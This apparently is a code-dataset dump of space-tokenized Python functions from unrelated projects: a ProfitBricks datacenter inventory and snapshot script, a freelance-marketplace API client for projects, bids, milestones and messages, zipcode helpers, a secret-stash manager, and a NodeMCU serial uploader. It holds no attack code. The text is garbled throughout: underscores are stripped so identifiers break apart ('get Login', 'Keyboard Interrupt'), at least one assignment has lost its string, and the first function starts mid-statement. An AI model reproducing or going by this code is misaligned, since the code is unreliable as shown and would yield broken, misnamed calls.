[ 'id' ] , len ( dc inv ) ) ) for row in dc inv : csvwriter . writerow ( row ) except Exception : traceback . print exc ( ) exit ( 2 ) # end for(datacenters) if args . show images : with open ( "pb datacenter images.csv" , 'w' ) as csvfile : csvwriter = csv . writer ( csvfile , delimiter = ';' , lineterminator = '\n' ) csvwriter . writerow ( [ 'Visibility' , 'Loc' , 'Rsc Type' , 'Sub Type' , 'Rsc ID' , 'Rsc Name' , 'State' , 'Lic Type' , 'Size' , 'Created' , 'Modified' ] ) img inv = get images ( pbclient ) for row in img inv : csvwriter . writerow ( row ) snap inv = get snapshots ( pbclient ) for row in snap inv : csvwriter . writerow ( row ) if args . show ipblocks : with open ( "pb datacenter ipblocks.csv" , 'w' ) as csvfile : csvwriter = csv . writer ( csvfile , delimiter = ';' , lineterminator = '\n' ) csvwriter . writerow ( [ 'Loc' , 'Rsc Type' , 'Rsc ID' , 'State' , 'Size' , 'IP addresses' ] ) ipblocks = get ipblocks ( pbclient ) for row in ipblocks : csvwriter . writerow ( row ) # file is automatically closed after with block if args . show networks : # the default depth=1 is sufficient, higher values don't provide more details datacenters = pbclient . list datacenters ( ) print ( "retrieved %i datacenters " % len ( datacenters [ 'items' ] ) ) with open ( "pb datacenter networks.csv" , 'w' ) as csvfile : csvwriter = csv . writer ( csvfile , delimiter = ';' , lineterminator = '\n' ) csvwriter . writerow ( [ 'DCID' , 'DC Name' , 'Loc' , 'LAN ID' , 'LAN name' , 'public' , 'State' , '# NI Cs' , 'NIC ID' , 'MAC address' , 'DHCP' , 'IP(s)' , 'NIC name' , 'Firewall' , 'Connected to' , 'ID' , 'Name' ] ) for dc in datacenters [ 'items' ] : try : dc net = get dc network ( pbclient , dc ) if verbose : print ( "DC %s has %i network entries" % ( dc [ 'id' ] , len ( dc net ) ) ) for row in dc net : csvwriter . writerow ( row ) except Exception : traceback . print exc ( ) exit ( 2 ) # end for(datacenters) # just for fun: #         if args.show requests: #             get requests(pbclient) print ( "%s finished w/o errors" % program name ) return 0 except Keyboard Interrupt : # handle keyboard interrupt return 0 except Exception : traceback . print exc ( ) sys . stderr . write ( "\n" + program name + ":  for help use --help\n" ) return 2
def main ( argv = None ) : if argv is None : argv = sys . argv else : sys . argv . extend ( argv ) program name = os . path . basename ( sys . argv [ 0 ] ) program version = "v%s" % version program build date = str ( updated ) program version message = '%%(prog)s %s (%s)' % ( program version , program build date ) program shortdesc = import ( ' main ' ) . doc . split ( "\n" ) [ 1 ] program license = % ( program shortdesc , str ( date ) ) try : # Setup argument parser parser = Argument Parser ( description = program license , formatter class = Raw Description Help Formatter ) parser . add argument ( '-u' , '--user' , dest = 'user' , help = 'the login name' ) parser . add argument ( '-p' , '--password' , dest = 'password' , help = 'the login password' ) parser . add argument ( '-L' , '--Login' , dest = 'loginfile' , default = None , help = 'the login file to use' ) parser . add argument ( '-d' , '--datacenterid' , dest = 'dc id' , required = True , default = None , help = 'datacenter ID of the server' ) parser . add argument ( '-o' , '--outfile' , dest = 'outfile' , default = 'dc-def ' + datetime . now ( ) . strftime ( '%Y-%m-%d %H%M%S' ) , help = 'the output file name' ) parser . add argument ( '-S' , '--Stopalways' , dest = 'stopalways' , action = 'store true' , help = 'power off even when VM is running' ) parser . add argument ( '-v' , '--verbose' , dest = "verbose" , action = "count" , default = 0 , help = "set verbosity level [default: %(default)s]" ) parser . add argument ( '-V' , '--version' , action = 'version' , version = program version message ) # Process arguments args = parser . parse args ( ) global verbose verbose = args . verbose if verbose > 0 : print ( "Verbose mode on" ) print ( "start {} with args {}" . format ( program name , str ( args ) ) ) outfile = args . outfile if outfile . endswith ( ".json" ) : outfile = os . path . splitext ( outfile ) print ( "Using output file base name '{}'" . format ( outfile ) ) ( user , password ) = get Login ( args . loginfile , args . user , args . password ) if user is None or password is None : raise Value Error ( "user or password resolved to None" ) pbclient = Profit Bricks Service ( user , password ) dc id = args . dc id # first get all server's VM and OS state to see if we can start srv info = get Server Info ( pbclient , dc id ) srvon = 0 for server in srv info : if server [ 'vmstate' ] != 'SHUTOFF' : print ( "VM {} is in state {}, but should be SHUTOFF" . format ( server [ 'name' ] , server [ 'vmstate' ] ) ) srvon += 1 # end for(srv info) if srvon > 0 and not args . stopalways : print ( "shutdown running OS before trying again" ) return 1 # now power off all V Ms before starting the snapshots for server in srv info : control Server State ( pbclient , dc id , server [ 'id' ] , action = 'POWEROFF' ) # now let's go dcdef = pbclient . get datacenter ( dc id , 5 ) print ( "starting dump of datacenter {}" . format ( dcdef [ 'properties' ] [ 'name' ] ) ) dcdef file = outfile + ' source.json' print ( "write source dc to {}" . format ( dcdef file ) ) write dc definition ( dcdef , dcdef file ) print ( "get existing Snapshots" ) # first get existing snapshots known snapshots = dict ( ) snapshots = pbclient . list snapshots ( ) for snap in snapshots [ 'items' ] : print ( "SNAP : {}" . format ( json . dumps ( snap ) ) ) known snapshots [ snap [ 'properties' ] [ 'name' ] ] = snap [ 'id' ] print ( "create Snapshots, this may take a while .." ) # we do NOT consider dangling volumes, only server-attached ones vol snapshots = dict ( ) # map volume id==snapshot name snapshot id for server in dcdef [ 'entities' ] [ 'servers' ] [ 'items' ] : print ( "- server {}" . format ( server [ 'properties' ] [ 'name' ] ) ) if 'volumes' not in server [ 'entities' ] : print ( " server {} has no volumes" . format ( server [ 'properties' ] [ 'name' ] ) ) continue # The volumes are attached by order of creation # Thus we must sort them to keep the order in the clone print ( "setting volume order by device Number" ) volumes = server [ 'entities' ] [ 'volumes' ] [ 'items' ] new order = sorted ( volumes , key = lambda vol : vol [ 'properties' ] [ 'device Number' ] ) server [ 'entities' ] [ 'volumes' ] [ 'items' ] = new order for volume in server [ 'entities' ] [ 'volumes' ] [ 'items' ] : vol id = volume [ 'id' ] # this will be the name too if vol id in known snapshots : print ( "use existing snapshot {} of volume {}" . format ( vol id , volume [ 'properties' ] [ 'name' ] ) ) vol snapshots [ vol id ] = known snapshots [ vol id ] else : print ( "taking snapshot {} of volume {}" . format ( vol id , volume [ 'properties' ] [ 'name' ] ) ) response = pbclient . create snapshot ( dc id , vol id , vol id , "auto-created by pb snapshot Datacenter" ) # response has no request id, need to check metadata state (BUSY, AVAILABLE..) vol snapshots [ vol id ] = response [ 'id' ] print ( "snapshot in progress: {}" . format ( str ( response ) ) ) # end for(volume) # end for(server) print ( "Waiting for snapshots to complete" ) snapdone = dict ( ) while len ( snapdone ) != len ( vol snapshots ) : sleep ( 10 ) for snap id in vol snapshots . values ( ) : print ( "looking for {}" . format ( snap id ) ) if snap id in snapdone : continue snapshot = pbclient . get snapshot ( snap id ) print ( "snapshot {} is in state {}" . format ( snap id , snapshot [ 'metadata' ] [ 'state' ] ) ) if snapshot [ 'metadata' ] [ 'state' ] == 'AVAILABLE' : snapdone [ snap id ] = snapshot [ 'metadata' ] [ 'state' ] # end for(vol snapshots) # end while(snapdone) # now replace the volumes image I Ds print ( "setting snapshot id to volumes" ) for server in dcdef [ 'entities' ] [ 'servers' ] [ 'items' ] : print ( "- server {}" . format ( server [ 'properties' ] [ 'name' ] ) ) if 'volumes' not in server [ 'entities' ] : print ( " server {} has no volumes" . format ( server [ 'properties' ] [ 'name' ] ) ) continue for volume in server [ 'entities' ] [ 'volumes' ] [ 'items' ] : vol id = volume [ 'id' ] # this will be the name too volume [ 'properties' ] [ 'image' ] = vol snapshots [ vol id ] # end for(volume) # end for(server) # As it came out, the LAN id is rearranged by order of creation # Thus we must sort the LA Ns to keep the order in the clone print ( "setting LAN order by id" ) lans = dcdef [ 'entities' ] [ 'lans' ] [ 'items' ] new order = sorted ( lans , key = lambda lan : lan [ 'id' ] ) dcdef [ 'entities' ] [ 'lans' ] [ 'items' ] = new order # now sort unordered NI Cs by MAC and save the dcdef # reason is, that NI Cs seem to be ordered by MAC, but API response # doesn't guarantee the order, which we need for re-creation print ( "setting NIC order by MAC" ) for server in dcdef [ 'entities' ] [ 'servers' ] [ 'items' ] : print ( "- server {}" . format ( server [ 'properties' ] [ 'name' ] ) ) if 'nics' not in server [ 'entities' ] : print ( " server {} has no nics" . format ( server [ 'properties' ] [ 'name' ] ) ) continue nics = server [ 'entities' ] [ 'nics' ] [ 'items' ] # print("NI Cs before {}".format(json.dumps(nics))) new order = sorted ( nics , key = lambda nic : nic [ 'properties' ] [ 'mac' ] ) # print("NI Cs after {}".format(json.dumps(new order))) server [ 'entities' ] [ 'nics' ] [ 'items' ] = new order # end for(server) dcdef file = outfile + '.json' print ( "write snapshot dc to {}" . format ( dcdef file ) ) write dc definition ( dcdef , dcdef file ) return 0 except Keyboard Interrupt : # handle keyboard interrupt return 0 except Exception : traceback . print exc ( ) sys . stderr . write ( "\n" + program name + ":  for help use --help\n" ) return 2
def get self ( session , user details = None ) : # Set compact to true if user details : user details [ 'compact' ] = True response = make get request ( session , 'self' , params data = user details ) json data = response . json ( ) if response . status code == 200 : return json data [ 'result' ] else : raise Self Not Retrieved Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def get user by id ( session , user id , user details = None ) : if user details : user details [ 'compact' ] = True response = make get request ( session , 'users/{}' . format ( user id ) , params data = user details ) json data = response . json ( ) if response . status code == 200 : return json data [ 'result' ] else : raise User Not Found Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def get self user id ( session ) : response = make get request ( session , 'self' ) if response . status code == 200 : return response . json ( ) [ 'result' ] [ 'id' ] else : raise User Id Not Retrieved Exception ( 'Error retrieving user id: %s' % response . text , response . text )
def add user jobs ( session , job ids ) : jobs data = { 'jobs[]' : job ids } response = make post request ( session , 'self/jobs' , json data = jobs data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'status' ] else : raise User Jobs Not Added Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def delete user jobs ( session , job ids ) : jobs data = { 'jobs[]' : job ids } response = make delete request ( session , 'self/jobs' , json data = jobs data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'status' ] else : raise User Jobs Not Deleted Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def get users ( session , query ) : # GET /api/users/0.1/users response = make get request ( session , 'users' , params data = query ) json data = response . json ( ) if response . status code == 200 : return json data [ 'result' ] else : raise Users Not Found Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def create hireme project ( session , title , description , currency , budget , jobs , hireme initial bid ) : jobs . append ( create job object ( id = 417 ) ) # Hire Me job, required project data = { 'title' : title , 'description' : description , 'currency' : currency , 'budget' : budget , 'jobs' : jobs , 'hireme' : True , 'hireme initial bid' : hireme initial bid } # POST /api/projects/0.1/projects/ response = make post request ( session , 'projects' , json data = project data ) json data = response . json ( ) if response . status code == 200 : project data = json data [ 'result' ] p = Project ( project data ) p . url = urljoin ( session . url , 'projects/%s' % p . seo url ) return p else : raise Project Not Created Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] , )
def get projects ( session , query ) : # GET /api/projects/0.1/projects response = make get request ( session , 'projects' , params data = query ) json data = response . json ( ) if response . status code == 200 : return json data [ 'result' ] else : raise Projects Not Found Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def get project by id ( session , project id , project details = None , user details = None ) : # GET /api/projects/0.1/projects/<int:project id> query = { } if project details : query . update ( project details ) if user details : query . update ( user details ) response = make get request ( session , 'projects/{}' . format ( project id ) , params data = query ) json data = response . json ( ) if response . status code == 200 : return json data [ 'result' ] else : raise Projects Not Found Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def search projects ( session , query , search filter = None , project details = None , user details = None , limit = 10 , offset = 0 , active only = None ) : search data = { 'query' : query , 'limit' : limit , 'offset' : offset , } if search filter : search data . update ( search filter ) if project details : search data . update ( project details ) if user details : search data . update ( user details ) # GET /api/projects/0.1/projects/all/ # GET /api/projects/0.1/projects/active/ endpoint = 'projects/{}' . format ( 'active' if active only else 'all' ) response = make get request ( session , endpoint , params data = search data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'result' ] else : raise Projects Not Found Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def place project bid ( session , project id , bidder id , description , amount , period , milestone percentage ) : bid data = { 'project id' : project id , 'bidder id' : bidder id , 'description' : description , 'amount' : amount , 'period' : period , 'milestone percentage' : milestone percentage , } # POST /api/projects/0.1/bids/ response = make post request ( session , 'bids' , json data = bid data ) json data = response . json ( ) if response . status code == 200 : bid data = json data [ 'result' ] return Bid ( bid data ) else : raise Bid Not Placed Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def get bids ( session , project ids = [ ] , bid ids = [ ] , limit = 10 , offset = 0 ) : get bids data = { } if bid ids : get bids data [ 'bids[]' ] = bid ids if project ids : get bids data [ 'projects[]' ] = project ids get bids data [ 'limit' ] = limit get bids data [ 'offset' ] = offset # GET /api/projects/0.1/bids/ response = make get request ( session , 'bids' , params data = get bids data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'result' ] else : raise Bids Not Found Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def get milestones ( session , project ids = [ ] , milestone ids = [ ] , user details = None , limit = 10 , offset = 0 ) : get milestones data = { } if milestone ids : get milestones data [ 'milestones[]' ] = milestone ids if project ids : get milestones data [ 'projects[]' ] = project ids get milestones data [ 'limit' ] = limit get milestones data [ 'offset' ] = offset # Add projections if they exist if user details : get milestones data . update ( user details ) # GET /api/projects/0.1/milestones/ response = make get request ( session , 'milestones' , params data = get milestones data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'result' ] else : raise Milestones Not Found Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def get milestone by id ( session , milestone id , user details = None ) : # GET /api/projects/0.1/milestones/{milestone id}/ endpoint = 'milestones/{}' . format ( milestone id ) response = make get request ( session , endpoint , params data = user details ) json data = response . json ( ) if response . status code == 200 : return json data [ 'result' ] else : raise Milestones Not Found Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def award project bid ( session , bid id ) : headers = { 'Content-Type' : 'application/x-www-form-urlencoded' } bid data = { 'action' : 'award' } # POST /api/projects/0.1/bids/{bid id}/?action=award endpoint = 'bids/{}' . format ( bid id ) response = make put request ( session , endpoint , headers = headers , params data = bid data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'status' ] else : json data = response . json ( ) raise Bid Not Awarded Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def revoke project bid ( session , bid id ) : headers = { 'Content-Type' : 'application/x-www-form-urlencoded' } bid data = { 'action' : 'revoke' } # POST /api/projects/0.1/bids/{bid id}/?action=revoke endpoint = 'bids/{}' . format ( bid id ) response = make put request ( session , endpoint , headers = headers , params data = bid data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'status' ] else : json data = response . json ( ) raise Bid Not Revoked Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def accept project bid ( session , bid id ) : headers = { 'Content-Type' : 'application/x-www-form-urlencoded' } bid data = { 'action' : 'accept' } # POST /api/projects/0.1/bids/{bid id}/?action=revoke endpoint = 'bids/{}' . format ( bid id ) response = make put request ( session , endpoint , headers = headers , params data = bid data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'status' ] else : json data = response . json ( ) raise Bid Not Accepted Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def retract project bid ( session , bid id ) : headers = { 'Content-Type' : 'application/x-www-form-urlencoded' } bid data = { 'action' : 'retract' } # POST /api/projects/0.1/bids/{bid id}/?action=revoke endpoint = 'bids/{}' . format ( bid id ) response = make put request ( session , endpoint , headers = headers , params data = bid data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'status' ] else : json data = response . json ( ) raise Bid Not Retracted Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def highlight project bid ( session , bid id ) : headers = { 'Content-Type' : 'application/x-www-form-urlencoded' } bid data = { 'action' : 'highlight' } # POST /api/projects/0.1/bids/{bid id}/?action=revoke endpoint = 'bids/{}' . format ( bid id ) response = make put request ( session , endpoint , headers = headers , params data = bid data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'status' ] else : json data = response . json ( ) raise Bid Not Highlighted Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def create milestone payment ( session , project id , bidder id , amount , reason , description ) : milestone data = { 'project id' : project id , 'bidder id' : bidder id , 'amount' : amount , 'reason' : reason , 'description' : description } # POST /api/projects/0.1/milestones/ response = make post request ( session , 'milestones' , json data = milestone data ) json data = response . json ( ) if response . status code == 200 : milestone data = json data [ 'result' ] return Milestone ( milestone data ) else : raise Milestone Not Created Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def post track ( session , user id , project id , latitude , longitude ) : tracking data = { 'user id' : user id , 'project id' : project id , 'track point' : { 'latitude' : latitude , 'longitude' : longitude } } # POST /api/projects/0.1/tracks/ response = make post request ( session , 'tracks' , json data = tracking data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'result' ] else : raise Track Not Created Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def get track by id ( session , track id , track point limit = None , track point offset = None ) : tracking data = { } if track point limit : tracking data [ 'track point limit' ] = track point limit if track point offset : tracking data [ 'track point offset' ] = track point offset # GET /api/projects/0.1/tracks/{track id}/ response = make get request ( session , 'tracks/{}' . format ( track id ) , params data = tracking data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'result' ] else : raise Track Not Found Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def release milestone payment ( session , milestone id , amount ) : params data = { 'action' : 'release' , } milestone data = { 'amount' : amount , } # PUT /api/projects/0.1/milestones/{milestone id}/?action=release endpoint = 'milestones/{}' . format ( milestone id ) response = make put request ( session , endpoint , params data = params data , json data = milestone data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'status' ] else : raise Milestone Not Released Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def request release milestone payment ( session , milestone id ) : params data = { 'action' : 'request release' , } # PUT /api/projects/0.1/milestones/{milestone id}/?action=release endpoint = 'milestones/{}' . format ( milestone id ) response = make put request ( session , endpoint , params data = params data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'status' ] else : raise Milestone Not Requested Release Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def cancel milestone payment ( session , milestone id ) : params data = { 'action' : 'cancel' , } # PUT /api/projects/0.1/milestones/{milestone id}/?action=release endpoint = 'milestones/{}' . format ( milestone id ) response = make put request ( session , endpoint , params data = params data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'status' ] else : raise Milestone Not Cancelled Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def create milestone request ( session , project id , bid id , description , amount ) : milestone request data = { 'project id' : project id , 'bid id' : bid id , 'description' : description , 'amount' : amount , } # POST /api/projects/0.1/milestone requests/ response = make post request ( session , 'milestone requests' , json data = milestone request data ) json data = response . json ( ) if response . status code == 200 : milestone request data = json data [ 'result' ] return Milestone Request ( milestone request data ) else : raise Milestone Request Not Created Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def accept milestone request ( session , milestone request id ) : params data = { 'action' : 'accept' , } # POST /api/projects/0.1/milestone requests/{milestone request id}/?action= # accept endpoint = 'milestone requests/{}' . format ( milestone request id ) response = make put request ( session , endpoint , params data = params data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'status' ] else : raise Milestone Request Not Accepted Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def reject milestone request ( session , milestone request id ) : params data = { 'action' : 'reject' , } # POST /api/projects/0.1/milestone requests/{milestone request id}/?action= # reject endpoint = 'milestone requests/{}' . format ( milestone request id ) response = make put request ( session , endpoint , params data = params data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'status' ] else : raise Milestone Request Not Rejected Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def delete milestone request ( session , milestone request id ) : params data = { 'action' : 'delete' , } # POST /api/projects/0.1/milestone requests/{milestone request id}/?action= # delete endpoint = 'milestone requests/{}' . format ( milestone request id ) response = make put request ( session , endpoint , params data = params data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'status' ] else : raise Milestone Request Not Deleted Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def get jobs ( session , job ids , seo details , lang ) : get jobs data = { 'jobs[]' : job ids , 'seo details' : seo details , 'lang' : lang , } # GET /api/projects/0.1/jobs/ response = make get request ( session , 'jobs' , params data = get jobs data ) json data = response . json ( ) if response . status code == 200 : return json data [ 'result' ] else : raise Jobs Not Found Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def create project thread ( session , member ids , project id , message ) : return create thread ( session , member ids , 'project' , project id , message )
def post message ( session , thread id , message ) : headers = { 'Content-Type' : 'application/x-www-form-urlencoded' } message data = { 'message' : message , } # POST /api/messages/0.1/threads/{thread id}/messages/ endpoint = 'threads/{}/messages' . format ( thread id ) response = make post request ( session , endpoint , headers , form data = message data ) json data = response . json ( ) if response . status code == 200 : return Message ( json data [ 'result' ] ) else : raise Message Not Created Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def post attachment ( session , thread id , attachments ) : files = [ ] filenames = [ ] for attachment in attachments : files . append ( attachment [ 'file' ] ) filenames . append ( attachment [ 'filename' ] ) message data = { 'attachments[]' : filenames , } # POST /api/messages/0.1/threads/{thread id}/messages/ endpoint = 'threads/{}/messages' . format ( thread id ) response = make post request ( session , endpoint , form data = message data , files = files ) json data = response . json ( ) if response . status code == 200 : return Message ( json data [ 'result' ] ) else : raise Message Not Created Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def get messages ( session , query , limit = 10 , offset = 0 ) : query [ 'limit' ] = limit query [ 'offset' ] = offset # GET /api/messages/0.1/messages response = make get request ( session , 'messages' , params data = query ) json data = response . json ( ) if response . status code == 200 : return json data [ 'result' ] else : raise Messages Not Found Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def get threads ( session , query ) : # GET /api/messages/0.1/threads response = make get request ( session , 'threads' , params data = query ) json data = response . json ( ) if response . status code == 200 : return json data [ 'result' ] else : raise Threads Not Found Exception ( message = json data [ 'message' ] , error code = json data [ 'error code' ] , request id = json data [ 'request id' ] )
def clean ( zipcode , valid length = valid zipcode length ) : zipcode = zipcode . split ( "-" ) [ 0 ] # Convert #####-#### to ##### if len ( zipcode ) != valid length : raise Value Error ( 'Invalid format, zipcode must be of the format: "#####" or "#####-####"' ) if contains nondigits ( zipcode ) : raise Value Error ( 'Invalid characters, zipcode may only contain digits and "-".' ) return zipcode
def similar to ( partial zipcode , zips = zips ) : return [ z for z in zips if z [ "zip code" ] . startswith ( partial zipcode ) ]
def filter by ( zips = zips , * * kwargs ) : return [ z for z in zips if all ( [ k in z and z [ k ] == v for k , v in kwargs . items ( ) ] ) ]
def is valid identifier ( name ) : if not isinstance ( name , str ) : return False if '\n' in name : return False if name . strip ( ) != name : return False try : code = compile ( '\n{0}=None' . format ( name ) , filename = '<string>' , mode = 'single' ) exec ( code ) return True except Syntax Error : return False
def build dict from key value ( keys and values ) : key dict = { } for key value in keys and values : if '=' not in key value : raise Ghost Error ( 'Pair {0} is not of `key=value` format' . format ( key value ) ) key , value = key value . split ( '=' , 1 ) key dict . update ( { str ( key ) : str ( value ) } ) return key dict
def purge stash ( force , stash , passphrase , backend ) : stash = get stash ( backend , stash , passphrase ) try : click . echo ( 'Purging stash...' ) stash . purge ( force ) # Maybe we should verify that the list is empty # afterwards? click . echo ( 'Purge complete!' ) except Ghost Error as ex : sys . exit ( ex )
def export keys ( output path , stash , passphrase , backend ) : stash = get stash ( backend , stash , passphrase ) try : click . echo ( 'Exporting stash to {0}...' . format ( output path ) ) stash . export ( output path = output path ) click . echo ( 'Export complete!' ) except Ghost Error as ex : sys . exit ( ex )
def get ( self , key name , decrypt = True ) : self . assert valid stash ( ) key = self . storage . get ( key name ) . copy ( ) if not key . get ( 'value' ) : return None if decrypt : key [ 'value' ] = self . decrypt ( key [ 'value' ] ) audit ( storage = self . storage . db path , action = 'GET' , message = json . dumps ( dict ( key name = key name ) ) ) return key
def list ( self , key name = None , max suggestions = 100 , cutoff = 0.5 , locked only = False , key type = None ) : self . assert valid stash ( ) key list = [ k for k in self . storage . list ( ) if k [ 'name' ] != 'stored passphrase' and ( k . get ( 'lock' ) if locked only else True ) ] if key type : # To maintain backward compatibility with keys without a type. # The default key type is secret, in which case we also look for # keys with no (None) types. types = ( 'secret' , None ) if key type == 'secret' else [ key type ] key list = [ k for k in key list if k . get ( 'type' ) in types ] key list = [ k [ 'name' ] for k in key list ] if key name : if key name . startswith ( '~' ) : key list = difflib . get close matches ( key name . lstrip ( '~' ) , key list , max suggestions , cutoff ) else : key list = [ k for k in key list if key name in k ] audit ( storage = self . storage . db path , action = 'LIST' + ( '[LOCKED]' if locked only else '' ) , message = json . dumps ( dict ( ) ) ) return key list
def delete ( self , key name ) : self . assert valid stash ( ) if key name == 'stored passphrase' : raise Ghost Error ( '`stored passphrase` is a reserved ghost key name ' 'which cannot be deleted' ) # TODO: Optimize. We get from the storage twice here for no reason if not self . get ( key name ) : raise Ghost Error ( 'Key `{0}` not found' . format ( key name ) ) key = self . storage . get ( key name ) if key . get ( 'lock' ) : raise Ghost Error ( 'Key `{0}` is locked and therefore cannot be deleted ' 'Please unlock the key and try again' . format ( key name ) ) deleted = self . storage . delete ( key name ) audit ( storage = self . storage . db path , action = 'DELETE' , message = json . dumps ( dict ( key name = key name ) ) ) if not deleted : raise Ghost Error ( 'Failed to delete {0}' . format ( key name ) )
def purge ( self , force = False , key type = None ) : self . assert valid stash ( ) if not force : raise Ghost Error ( "The `force` flag must be provided to perform a stash purge. " "I mean, you don't really want to just delete everything " "without precautionary measures eh?" ) audit ( storage = self . storage . db path , action = 'PURGE' , message = json . dumps ( dict ( ) ) ) for key name in self . list ( key type = key type ) : self . delete ( key name )
def export ( self , output path = None , decrypt = False ) : self . assert valid stash ( ) all keys = [ ] for key in self . list ( ) : # We `dict` this as a precaution as tinydb returns # a tinydb.database.Element instead of a dictionary # and well.. I ain't taking no chances all keys . append ( dict ( self . get ( key , decrypt = decrypt ) ) ) if all keys : if output path : with open ( output path , 'w' ) as output file : output file . write ( json . dumps ( all keys , indent = 4 ) ) return all keys else : raise Ghost Error ( 'There are no keys to export' )
def decrypt ( self , hexified value ) : encrypted value = binascii . unhexlify ( hexified value ) with warnings . catch warnings ( ) : warnings . simplefilter ( "ignore" ) jsonified value = self . cipher . decrypt ( encrypted value ) . decode ( 'ascii' ) value = json . loads ( jsonified value ) return value
def delete ( self , key name ) : self . db . remove ( Query ( ) . name == key name ) return self . get ( key name ) == { }
def put ( self , key ) : self . consul request ( 'PUT' , self . key url ( key [ 'name' ] ) , json = key ) return key [ 'name' ]
def put ( self , key ) : self . client . write ( self . key path ( key [ 'name' ] ) , * * key ) return self . key path ( key [ 'name' ] )
def init ( self ) : # ignore 400 (Index Already Exists Exception) when creating an index self . es . indices . create ( index = self . params [ 'index' ] , ignore = 400 )
def init ( self ) : try : self . client . create bucket ( Bucket = self . db path , Create Bucket Configuration = self . bucket configuration ) except botocore . exceptions . Client Error as e : # If the bucket already exists if 'Bucket Already Owned By You' not in str ( e . response [ 'Error' ] [ 'Code' ] ) : raise e
def terminal ( port = default port ( ) , baud = '9600' ) : testargs = [ 'nodemcu-uploader' , port , baud ] # TODO: modifying argv is no good sys . argv = testargs # resuse miniterm on main function miniterm . main ( )
def set baudrate ( self , baud ) : log . info ( 'Changing communication to %s baud' , baud ) self . writeln ( UART SETUP . format ( baud = baud ) ) # Wait for the string to be sent before switching baud time . sleep ( 0.1 ) try : self . port . set Baudrate ( baud ) except Attribute Error : #py Serial 2.7 self . port . baudrate = baud
def set timeout ( self , timeout ) : timeout = int ( timeout ) # will raise on Error self . timeout = timeout == 0 and 999999 or timeout
def clear buffers ( self ) : try : self . port . reset input buffer ( ) self . port . reset output buffer ( ) except Attribute Error : #py Serial 2.7 self . port . flush Input ( ) self . port . flush Output ( )
def expect ( self , exp = '> ' , timeout = None ) : timeout before = self . port . timeout timeout = timeout or self . timeout #do NOT set timeout on Windows if SYSTEM != 'Windows' : # Checking for new data every 100us is fast enough if self . port . timeout != MINIMAL TIMEOUT : self . port . timeout = MINIMAL TIMEOUT end = time . time ( ) + timeout # Finish as soon as either exp matches or we run out of time (work like dump, but faster on success) data = '' while not data . endswith ( exp ) and time . time ( ) <= end : data += self . port . read ( ) log . debug ( 'expect returned: `{0}`' . format ( data ) ) if time . time ( ) > end : raise Communication Timeout ( 'Timeout waiting for data' , data ) if not data . endswith ( exp ) and len ( exp ) > 0 : raise Bad Response Exception ( 'Bad response.' , exp , data ) if SYSTEM != 'Windows' : self . port . timeout = timeout before return data
